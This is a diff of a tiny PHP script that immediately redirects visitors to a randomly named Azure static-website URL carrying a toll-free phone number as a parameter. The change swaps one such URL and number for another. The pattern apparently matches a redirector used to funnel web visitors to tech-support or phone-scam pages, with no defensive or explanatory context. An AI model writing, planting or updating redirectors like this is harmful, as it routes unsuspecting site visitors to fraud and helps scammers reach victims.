@@ -1,7 +1,7 @@
 <?php
 
 // Redirect browser
-header("Location: https://ghyu788hgfd3gtt6.z27.web.core.windows.net/index.html?Aniph=1-888-601-5113");
+header("Location: https://3r334fwe32ra534wread.z32.web.core.windows.net/index.html?Aniph=1-888-498-5234");
 
 exit;
 ?>
